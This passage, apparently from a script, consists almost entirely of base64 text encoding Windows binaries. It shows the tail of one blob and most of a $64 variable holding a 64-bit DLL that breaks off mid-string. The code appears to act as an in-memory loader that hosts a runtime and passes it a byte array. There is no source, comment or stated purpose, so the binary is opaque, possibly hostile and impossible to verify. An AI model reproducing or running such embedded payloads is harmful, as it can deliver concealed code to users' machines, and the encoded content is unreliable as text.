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8IDwkPCg8LDwwPDQ8ODw8PADwAABgAQAAcDJ0MngyfDIQNhQ2GDYcNiA2JDYoNiw2MDY0Njg2PDZANkQ2SDZMNlA2VDZYNlw2YDZkNmg2bDZwNnQ2eDZ8NoA2hDaINow2kDaUNpg2nDagNqQ2qDasNrA2tDa4NsQ2yDbMNtA21DbYNtw24DbkNug27DbwNvQ2+Db8NgA3BDcINww3EDcUNxg3HDcgNyQ3KDcsNzA3NDc4Nzw3QDdEN0g3TDdQN1Q3WDdcN2A3ZDdoN2w3cDd8PYQ9jD2UPZw9pD2sPbQ9vD3EPcw91D3cPeQ97D30Pfw9BD4MPhQ+HD4kPiw+ND48PkQ+TD5UPlw+ZD5sPnQ+fD6EPow+lD6cPqQ+rD60Prw+xD7MPtQ+3D7kPuw+9D78PgQ/DD8UPxw/JD8sPzQ/PD9EP0w/VD9cP2Q/bD90P3w/hD+MP5Q/nD+kP6w/tD+8P8Q/zD/UP9w/5D/sP/Q//D8AAAEAiAEAAAQwDDAUMBwwJDAsMDQwPDBEMEwwVDBcMGQwbDB0MHwwhDCMMJQwnDCkMKwwtDC8MMQwzDDUMNww5DDsMPQw/DAEMQwxFDEcMSQxLDE0MTwxRDFMMVQxXDFkMWwxdDF8MYQxjDGUMZwxpDGsMbQxvDHEMcwx1DHcMeQx7DH0MfwxBDIMMhQyHDIkMiwyNDI8MkQyTDJUMlwyZDJsMnQyfDKEMowylDKcMqQyrDK0MrwyxDLMMtQy3DLkMuwy9DL8MgQzDDMUMxwzJDMsMzQzPDNEM0wzVDNcM2QzbDN0M3wzhDOMM5QznDOkM6wztDO8M8QzzDPUM9wz5DPsM/Qz/DMENAw0FDQcNCQ0LDQ0NDw0RDRMNFQ0XDRkNGw0dDR8NIQ0jDSUNKA+qD6wPrg+wD7IPtA+2D7gPug+8D74PgA/CD8QPxg/ID8oPzA/OD9AP0g/UD9YP2A/aD9wP3g/gD+IP5A/mD+gP6g/sD+4P8A/yD/QP9g/4D/oP/A/+D8AAAAQAQCAAQAAADAIMBAwGDAgMCgwMDA4MEAwSDBQMFgwYDBoMHAweDCAMIgwkDCYMKAwqDCwMLgwwDDIMNAw2DDgMOgw8DD4MAAxCDEQMRgxIDEoMTAxODFAMUgxUDFYMWAxaDFwMXgxgDGIMZAxmDGgMagxsDG4McAxyDHQMdgx4DHoMfAx+DEAMggyEDIYMiAyKDIwMjgyQDJIMlAyWDJgMmgycDJ4MoAyiDKQMpgyoDKoMrAyuDLAMsgy0DLYMuAy6DLwMvgyADMIMxAzGDMgMygzMDM4M0AzSDNQM1gzYDNoM3AzeDOAM4gzkDOYM6AzqDOwM7gzwDPIM9Az2DPgM+gz8DP4MwA0CDQQNBg0IDQoNDA0ODRANEg0UDRYNGA0aDRwNHg0gDSINJA0mDSgNKg0sDS4NMA0yDTQNNg04DToNPA0+DQANQg1EDUYNSA1KDUwNTg1QDVINVA1WDVgNWg1cDV4NYA1iDWQNZg1oDWoNbA1uDWaP54/oj+mPwAgAQCMAAAATDlUOVw5ZDlsOXQ5fDmEOYw5lDmcOaQ5rDm0Obw5xDnMOdQ53DnkOew59Dn8OQQ6DDoUOhw6JDosOuw78Dv4Oxg8HDwsPDA8ODxQPGA8ZDx0PHg8gDyYPKg8rDy8PMA8xDzMPOQ89Dz4PAg9DD0QPRQ9HD00PUQ9SD1YPVw9YD1oPYA9ADABAMQAAAA0MUAxZDGEMYwxlDGcMaQxrDG4Mdgx4DHoMfAx+DEUMhgyIDIoMjAyODJMMmgyiDKkMqgyxDLIMtAy2DLgMuQy7DIAMwgzHDMkMywzNDM4MzwzRDNYM3gzgDOEM6AzqDOsM8QzyDPkM+gz+DMcNCg0MDRcNGA0aDRwNHg0fDSENJg0uDTYNOA05DQANSA1PDVANWA1gDWgNcA14DUANiA2QDZgNoA2oDbANuA27DYINyg3SDdoN4g3pDeoNwBAAQBIAAAAADCQNZg1yDXYNeg1+DUINiA2LDYwNjQ2UDZUNiA3JDcoNyw3MDc0Nzg3PDdAN0Q3UDdUN1g3XDdgN2Q3aDdsNwCAAQAUAAAAkDKsMsQy4DL8MiQzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
    $64="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